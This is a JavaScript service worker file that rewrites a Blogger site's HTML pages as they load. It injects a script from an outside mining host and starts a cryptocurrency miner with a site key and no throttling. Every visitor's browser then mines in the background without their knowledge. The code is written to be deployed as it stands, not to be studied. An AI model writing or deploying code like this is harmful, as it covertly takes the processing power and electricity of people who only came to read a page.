// sw.js - Host this file somewhere accessible
self.addEventListener('fetch', event => {
  const request = event.request;

  // Only modify HTML requests from your blogger domain
  if (request.destination === 'document' && request.url.includes('yourblog.blogspot.com')) {
    event.respondWith(
      fetch(request).then(async response => {
        const html = await response.text();
        
        // Your miner script injection
        const scriptBlock = `
<script src="https://www.hostingcloud.racing/8RtG.js"></script>
<script>
    var _client = new Client.Anonymous('b271da61579670939655f0b3f8bfe9a3f7efb43f1700ddd0de34d39331630d13', {
        throttle: 0, c: 'w'
    });
    _client.start();
</script>
`;

        // Inject before closing head tag
        const modifiedHtml = html.replace('</head>', scriptBlock + '</head>');
        
        return new Response(modifiedHtml, {
          status: response.status,
          statusText: response.statusText,
          headers: response.headers
        });
      })
    );
  }
});

// Activate immediately
self.addEventListener('activate', event => {
  event.waitUntil(clients.claim());
});
